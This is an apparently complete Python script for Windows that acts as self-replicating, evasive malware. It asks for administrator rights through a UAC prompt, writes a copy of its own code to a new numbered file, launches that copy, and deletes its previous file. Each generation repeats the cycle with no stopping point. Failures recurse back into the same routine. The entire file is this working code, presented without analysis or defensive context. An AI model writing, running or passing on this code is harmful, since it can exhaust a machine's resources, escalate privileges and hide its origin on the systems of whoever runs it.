times = 0
PATH = ''
# this is the first mole!
import subprocess,os,sys,ctypes
times = times+1
this = __file__


if ctypes.windll.shell32.IsUserAnAdmin():
    pass
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()

def self_copy():
    with open(__file__, 'r+')as this_file:
        this = this_file.readlines()[2:]
    temp = ''
    for x in this:
        temp = temp+x
    this = temp
    with open("mole"+str(times)+".py", 'w+')as file:
        file.write('times=%s\nPATH=r"%s"\n%s' % (times, __file__, this))


def call_up():
    print('this is the %s mole!' % (times-1))
    subprocess.Popen("python mole"+str(times)+".py")


def change():
    try:
        self_copy()
    except:
        change()
    finally:
        call_up()
    try:
        os.remove(PATH)
    except:
        change()


change()
